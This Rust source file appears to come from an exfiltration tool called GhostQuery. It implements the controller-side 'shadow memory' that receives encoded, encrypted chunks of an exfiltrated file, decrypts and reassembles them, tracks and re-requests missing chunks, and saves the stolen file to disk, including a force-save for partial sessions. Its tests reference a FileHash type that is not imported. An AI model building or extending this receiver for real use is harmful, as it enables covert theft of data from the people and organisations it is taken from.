//! Shadow memory implementation for the controller.
//!
//! Maintains a copy of the exfiltrated file as chunks arrive,
//! similar to ADSM's shadow memory on the CPU side.

use std::collections::HashMap;
use std::path::Path;

use parking_lot::RwLock;

use crate::common::error::{GhostQueryError, Result};
use crate::common::types::{ChunkId, SessionId, SessionMetadata};
use crate::crypto::cipher::AesGcmCipher;
use crate::crypto::keys::KeyManager;
use crate::encoding::GhostEncoder;
use crate::protocol::chunker::ChunkReassembler;
use crate::protocol::coherence::CoherenceProtocol;

/// Shadow memory for a single session
pub struct SessionShadow {
    /// Session metadata
    pub metadata: SessionMetadata,
    /// Coherence protocol handler
    pub coherence: CoherenceProtocol,
    /// Chunk reassembler
    pub reassembler: ChunkReassembler,
    /// Cipher for decryption
    cipher: AesGcmCipher,
    /// Encoder for decoding
    encoder: GhostEncoder,
    /// Whether session is complete
    is_complete: bool,
}

impl SessionShadow {
    /// Create a new session shadow
    pub fn new(metadata: SessionMetadata, key_manager: &KeyManager) -> Result<Self> {
        let cipher = key_manager.cipher_for_session(metadata.session_id.as_bytes())?;

        let reassembler = ChunkReassembler::new(
            metadata.total_chunks,
            metadata.chunk_size,
            metadata.file_hash.clone(),
        )
        .with_decryption(cipher.clone(), *metadata.session_id.as_bytes());

        Ok(Self {
            coherence: CoherenceProtocol::new(metadata.total_chunks),
            reassembler,
            cipher,
            encoder: GhostEncoder::new(),
            metadata,
            is_complete: false,
        })
    }

    /// Receive an encoded chunk
    pub fn receive_encoded_chunk(
        &mut self,
        sequence: u32,
        encoded_payload: &str,
    ) -> Result<ChunkReceiveResult> {
        // Decode the payload
        let encrypted_data = self.encoder.decode_chunk(encoded_payload)?;

        // Create a chunk for the reassembler
        let chunk = crate::common::types::Chunk::new(
            ChunkId::new(sequence),
            encrypted_data,
            sequence == self.metadata.total_chunks - 1,
        );

        // Add to reassembler (handles decryption)
        self.reassembler.add_chunk(&chunk)?;

        // Update coherence protocol
        let action = self.coherence.receive_chunk(ChunkId::new(sequence));

        match action {
            crate::protocol::coherence::CoherenceAction::Ack => {
                Ok(ChunkReceiveResult::Ack)
            }
            crate::protocol::coherence::CoherenceAction::RequestRetransmit(missing) => {
                Ok(ChunkReceiveResult::Retransmit(missing))
            }
            crate::protocol::coherence::CoherenceAction::Complete => {
                self.is_complete = true;
                Ok(ChunkReceiveResult::Complete)
            }
            crate::protocol::coherence::CoherenceAction::Error(e) => Err(e),
        }
    }

    /// Check if all chunks have been received
    pub fn is_complete(&self) -> bool {
        self.is_complete || self.coherence.is_complete()
    }

    /// Get completion percentage
    pub fn completion_pct(&self) -> f64 {
        self.reassembler.completion_pct()
    }

    /// Get missing chunks
    pub fn missing_chunks(&self) -> Vec<ChunkId> {
        self.reassembler.missing_chunks()
    }

    /// Reassemble the file
    pub fn reassemble(&self) -> Result<Vec<u8>> {
        self.reassembler.reassemble()
    }

    /// Save reassembled file to disk
    pub fn save_to_file<P: AsRef<Path>>(&self, path: P) -> Result<()> {
        let data = self.reassemble()?;
        std::fs::write(path, &data)
            .map_err(|e| GhostQueryError::FileWriteError(e.to_string()))?;
        Ok(())
    }
}

/// Result of receiving a chunk
#[derive(Debug)]
pub enum ChunkReceiveResult {
    /// Chunk received successfully
    Ack,
    /// Need retransmission of these chunks
    Retransmit(Vec<ChunkId>),
    /// All chunks received
    Complete,
}

/// Shadow memory manager for multiple sessions
pub struct ShadowMemory {
    /// Active sessions
    sessions: RwLock<HashMap<SessionId, SessionShadow>>,
    /// Key manager
    key_manager: KeyManager,
    /// Output directory for completed files
    output_dir: Option<std::path::PathBuf>,
}

impl ShadowMemory {
    /// Create a new shadow memory manager
    pub fn new(key_manager: KeyManager) -> Self {
        Self {
            sessions: RwLock::new(HashMap::new()),
            key_manager,
            output_dir: None,
        }
    }

    /// Set output directory for completed files
    pub fn with_output_dir<P: AsRef<Path>>(mut self, path: P) -> Self {
        self.output_dir = Some(path.as_ref().to_path_buf());
        self
    }

    /// Initialize a new session
    pub fn init_session(&self, metadata: SessionMetadata) -> Result<()> {
        let session_id = metadata.session_id;
        let shadow = SessionShadow::new(metadata, &self.key_manager)?;

        self.sessions.write().insert(session_id, shadow);
        Ok(())
    }

    /// Receive a chunk for a session
    pub fn receive_chunk(
        &self,
        session_id: SessionId,
        sequence: u32,
        encoded_payload: &str,
    ) -> Result<ChunkReceiveResult> {
        let mut sessions = self.sessions.write();
        let shadow = sessions
            .get_mut(&session_id)
            .ok_or_else(|| GhostQueryError::SessionNotFound(session_id.to_string()))?;

        shadow.receive_encoded_chunk(sequence, encoded_payload)
    }

    /// Check if a session is complete
    pub fn is_session_complete(&self, session_id: &SessionId) -> bool {
        self.sessions
            .read()
            .get(session_id)
            .map(|s| s.is_complete())
            .unwrap_or(false)
    }

    /// Get session completion percentage
    pub fn session_progress(&self, session_id: &SessionId) -> f64 {
        self.sessions
            .read()
            .get(session_id)
            .map(|s| s.completion_pct())
            .unwrap_or(0.0)
    }

    /// Complete a session and return the data
    pub fn complete_session(&self, session_id: &SessionId) -> Result<Vec<u8>> {
        let sessions = self.sessions.read();
        let shadow = sessions
            .get(session_id)
            .ok_or_else(|| GhostQueryError::SessionNotFound(session_id.to_string()))?;

        if !shadow.is_complete() {
            return Err(GhostQueryError::InternalError(
                "Session not complete".to_string(),
            ));
        }

        shadow.reassemble()
    }

    /// Save completed session to file
    pub fn save_session<P: AsRef<Path>>(&self, session_id: &SessionId, path: P) -> Result<()> {
        let sessions = self.sessions.read();
        let shadow = sessions
            .get(session_id)
            .ok_or_else(|| GhostQueryError::SessionNotFound(session_id.to_string()))?;

        shadow.save_to_file(path)
    }

    /// Force save session (even if not complete) - returns bytes written
    pub fn force_save_session<P: AsRef<Path>>(
        &self,
        session_id: &SessionId,
        path: P,
    ) -> Result<usize> {
        let sessions = self.sessions.read();
        let shadow = sessions
            .get(session_id)
            .ok_or_else(|| GhostQueryError::SessionNotFound(session_id.to_string()))?;

        let data = shadow.reassembler.get_received_data();
        std::fs::write(&path, &data)
            .map_err(|e| GhostQueryError::FileWriteError(e.to_string()))?;
        
        Ok(data.len())
    }

    /// Remove a session
    pub fn remove_session(&self, session_id: &SessionId) {
        self.sessions.write().remove(session_id);
    }

    /// Get all active session IDs
    pub fn active_sessions(&self) -> Vec<SessionId> {
        self.sessions.read().keys().copied().collect()
    }

    /// Get session metadata
    pub fn session_metadata(&self, session_id: &SessionId) -> Option<SessionMetadata> {
        self.sessions
            .read()
            .get(session_id)
            .map(|s| s.metadata.clone())
    }

    /// Get statistics for a session
    pub fn session_stats(&self, session_id: &SessionId) -> Option<ShadowStats> {
        let sessions = self.sessions.read();
        sessions.get(session_id).map(|shadow| {
            let stats = shadow.coherence.stats();
            ShadowStats {
                session_id: *session_id,
                total_chunks: stats.total,
                received_chunks: stats.valid,
                missing_chunks: stats.invalid + stats.dirty,
                completion_pct: stats.completion_pct,
                is_complete: shadow.is_complete(),
            }
        })
    }
}

/// Statistics about a shadow session
#[derive(Debug, Clone)]
pub struct ShadowStats {
    pub session_id: SessionId,
    pub total_chunks: u32,
    pub received_chunks: u32,
    pub missing_chunks: u32,
    pub completion_pct: f64,
    pub is_complete: bool,
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_shadow_memory_creation() {
        let key_manager = KeyManager::new();
        let shadow = ShadowMemory::new(key_manager);

        assert!(shadow.active_sessions().is_empty());
    }

    #[test]
    fn test_session_initialization() {
        let key_manager = KeyManager::new();
        let shadow = ShadowMemory::new(key_manager);

        let session_id = SessionId::new();
        let metadata = SessionMetadata::new(
            session_id,
            FileHash::new([0u8; 32]),
            10,
            32,
            320,
        );

        shadow.init_session(metadata).unwrap();
        assert!(shadow.active_sessions().contains(&session_id));
    }

    #[test]
    fn test_session_progress() {
        let key_manager = KeyManager::new();
        let shadow = ShadowMemory::new(key_manager);

        let session_id = SessionId::new();
        let metadata = SessionMetadata::new(
            session_id,
            FileHash::new([0u8; 32]),
            10,
            32,
            320,
        );

        shadow.init_session(metadata).unwrap();

        assert_eq!(shadow.session_progress(&session_id), 0.0);
        assert!(!shadow.is_session_complete(&session_id));
    }
}

